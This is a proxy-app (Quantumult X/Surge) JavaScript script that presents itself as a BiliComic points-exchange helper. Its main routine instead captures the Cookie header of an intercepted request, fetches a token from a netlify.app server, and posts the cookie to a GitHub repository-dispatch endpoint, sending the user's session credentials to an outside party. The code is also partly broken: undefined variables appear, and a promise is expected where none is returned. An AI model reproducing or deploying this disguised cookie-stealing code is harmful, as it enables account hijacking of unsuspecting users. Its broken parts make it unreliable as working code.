function wuy() {
	const isSurge = typeof $httpClient != "undefined";
	const isQuanX = typeof $task != "undefined";
	const isNode = typeof require == "function";
	const node = (() => {
		if (isNode) {
			const request = require('request');
			return {
				request
			}
		} else {
			return null;
		}
	})()
	const adapterStatus = (response) => {
		if (response) {
			if (response.status) {
				response["statusCode"] = response.status
			} else if (response.statusCode) {
				response["status"] = response.statusCode
			}
		}
		return response
	}
    // 将获得的cookies信息储存起来
    this.write = (value, key) => {
        if (isQuanX) return $prefs.setValueForKey(value, key);
        if (isSurge) return $persistentStore.write(value, key);
        if (isNode) {
            try {
                if (!node.fs.existsSync(NodeSet)) node.fs.writeFileSync(NodeSet, JSON.stringify({}));
                const dataValue = JSON.parse(node.fs.readFileSync(NodeSet));
                if (value) dataValue[key] = value;
                if (!value) delete dataValue[key];
                return node.fs.writeFileSync(NodeSet, JSON.stringify(dataValue));
            } catch (er) {
                return AnError("Node.js持久化写入", null, er);
            }
        }
    };
	this.read = (key) => {
		if (isQuanX) return $prefs.valueForKey(key)
		if (isSurge) return $persistentStore.read(key)
	}
    // 异常信息
    const AnError = (name, keyname, er, resp, body) => {
        if (typeof (merge) != "undefined" && keyname) {
            if (!merge[keyname].notify) {
                merge[keyname].notify = `${ name }: 异常, 已输出日志 ‼️`;
            } else {
                merge[keyname].notify += `\n${ name }: 异常, 已输出日志 ‼️ (2)`;
            }
            merge[keyname].error = 1;
        }
        return console.log(`\n‼️${ name }发生错误\n‼️名称: ${ er.name }\n‼️描述: ${ er.message }${ JSON.stringify(er).match(/"line"/) ? `\n‼️行列: ${ JSON.stringify(er) }` : `` }${ resp && resp.status ? `\n‼️状态: ${ resp.status }` : `` }${ body ? `\n‼️响应: ${ resp && resp.status != 503 ? body : `Omit.` }` : `` }`);
    };
	this.notify = (title, subtitle, message) => {
		if (isQuanX) $notify(title, subtitle, message)
		if (isSurge) $notification.post(title, subtitle, message)
		if (isNode) console.log(`${title}\n${subtitle}\n${message}`)
	}
	this.get = (options, callback) => {
		options.headers["User-Agent"] = "JD4iPhone/167169 (iPhone; iOS 13.4.1; Scale/3.00)";
		if (isQuanX) {
		  if (typeof options == "string") 
			options = {
				url: options
			};
		  options["method"] = "GET";
		  $task.fetch(options).then(response => {
			callback(null, adapterStatus(response), response.body);
		  }, reason => callback(reason.error, null, null));
		}
		if (isSurge) {
		  options.headers["X-Surge-Skip-Scripting"] = false;
		  $httpClient.get(options, (error, response, body) => {
			callback(error, adapterStatus(response), body);
		  });
		}
		if (isNode) {
		  node.request(options, (error, response, body) => {
			callback(error, adapterStatus(response), body);
		  });
		}
	};
	this.post = (options, callback) => {
		options.headers['User-Agent'] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/609.3.5.0.2 (KHTML, like Gecko) Mobile/17G80 BiliApp/822 mobi_app/ios_comic channel/AppStore BiliComic/822'
		if (isQuanX) {
			if (typeof options == "string") options = {
				url: options
			}
			options["method"] = "POST"
			$task.fetch(options).then(response => {
				callback(null, adapterStatus(response), response.body)
			}, reason => callback(reason.error, null, null))
		}
		if (isSurge) {
			options.headers['X-Surge-Skip-Scripting'] = false
			$httpClient.post(options, (error, response, body) => {
				callback(error, adapterStatus(response), body)
			})
		}
		if (isNode) {
			node.request.post(options, (error, response, body) => {
				callback(error, adapterStatus(response), body)
			})
		}
	}
	this.done = () => {
		if (isQuanX || isSurge) {
			$done()
		}
	}
};

let $ = new wuy();
let productName = $.read('BM_ProductName') || '积分兑换';
let productNum = $.read('BM_ProductNum');
let exchangeNum = $.read('BM_ExchangeNum') || '100';
let cookie = $.read('CookieBM');
let user = {};

function getGToken() {
	const url = "https://wuyserver.netlify.app/.netlify/functions/token"
	$.get(url).then((response) => {
		try {
			if (response.statusCode == 200) {
				token = JSON.parse(response.message);
				$.write(token, 'gToken');
				return token;
			} else {
				$.notify("获取用户信息失败", "", response.body);
			}
		} catch (e) {
			$.AnError("获取用户信息", "getUserInfo", e, response);
		}
		$.done();
	})
}

function send2Github(cookie,token){
    const url = {
        url:"https://api.github.com/repos/hello-wy/qx/dispatches",
        headers: {
            Accept: "application/vnd.github.v3+json",
            Authorization: "token ghp_"+ token,
        },
        data: JSON.stringify({
            event_type: "ak",
            client_payload: {
                url_parameter: cookie
            }
        })
    }
    
    return new Promise(resolve => {
        $.post(url,(error, response, data) => {
            try { 
				if (error) {
					throw new Error(error); //如果请求失败, 例如无法联网, 则抛出一个异常
				}
			} catch (e) {
				console.log(`\n失败原因: ${e.message}`);
				resolve(); 
			}
        })
    });
}
(async function() {
    const cookieVal = $request.headers['Cookie']
	console.log(cookieVal);
	console.log("change:"+123);
	const token = await getGToken();
	console.log(token);
	console.log("gtoken :"+$.read('gToken'));
    await send2Github(cookieVal,token);
	// await Promise.all([ //该方法用于将多个实例包装成一个新的实例, 可以简单理解为同时调用函数, 以进一步提高执行速度
	// 	GetUserPoint(), 
	// 	ListProduct() 
	// ]);
	$.done(); 
})();